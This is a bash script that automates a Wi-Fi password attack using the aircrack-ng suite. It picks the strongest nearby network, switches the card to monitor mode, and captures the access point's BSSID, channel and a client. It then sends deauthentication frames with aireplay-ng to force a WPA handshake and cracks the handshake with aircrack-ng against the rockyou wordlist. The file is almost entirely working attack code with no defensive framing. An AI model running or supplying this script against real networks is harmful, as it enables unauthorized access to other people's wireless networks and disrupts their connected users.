#!/bin/bash

#Removing the wlan0mon 
function remove_mon {
airmon-ng stop wlan0mon > //dev/null
ifconfig wlan0 up
}

#attack1 Function
attack1(){
echo "The password has been cracked !"

}

#Removing  the save file
rm save.txt
rm oneAP.txt
rm outcrack.txt
ifconfig wlan0 up

#Store the strongest signal ESSID
essid=$(iwlist wlan0 scan | grep "ESSID:" | head -1 | tr -d " " | sed 's/ESSID://g' | sed 's/\"//g')

#store ESSID in a Txt file
echo "The best ESSID is :" $essid
echo $essid >> ssid.txt 

#Hacking the WIFI network Script
#Changing to mon mode
airmon-ng start wlan0 > /dev/null

#airdump-ng to check the bssid and access point info
gnome-terminal -x sh -c "airodump-ng --essid $essid wlan0mon 2>> save.txt | sleep 15 | exit; exec bash" 
echo  "Opened in new terminal"
sleep 15
echo "BSSID IS SAVED !!!"
bssid=$(cat save.txt | grep "PSK" | head -1 | cut -d " " -f2)
channel=$(cat save.txt | grep "PSK" | head -1 | cut -d " " -f27)
echo "The bssid is $bssid & The Channel is $channel"

#Focusing on Airodump-ng on one AP
gnome-terminal -x sh -c "airodump-ng --bssid $bssid  wlan0mon 2>> oneAP.txt | sleep 10 | exit; exec bash"  
sleep 10
client=$(cat oneAP.txt | grep $bssid | grep -v  PSK | tail -1 | cut -d " " -f4 | tr -d " ")
echo "Station is $client"
gnome-terminal -x sh -c "airodump-ng --bssid $bssid -c $channel  --write CrackFile wlan0mon 2>> outcrack.txt ; exec bash"
sleep 5
gnome-terminal -x sh -c "aireplay-ng -0 5 -a $bssid -c $client wlan0mon 2>> PassRes.txt ; exec bash"
sleep 40

#check if WPA is saved
if grep -q "WPA handshake" outcrack.txt; 
then
 echo "Trying to Crack the Password !"
 aircrack-ng CrackFile-0*.cap -w rockyou.txt 
 attack1
else
 echo "WPA Was not Captured !"
fi


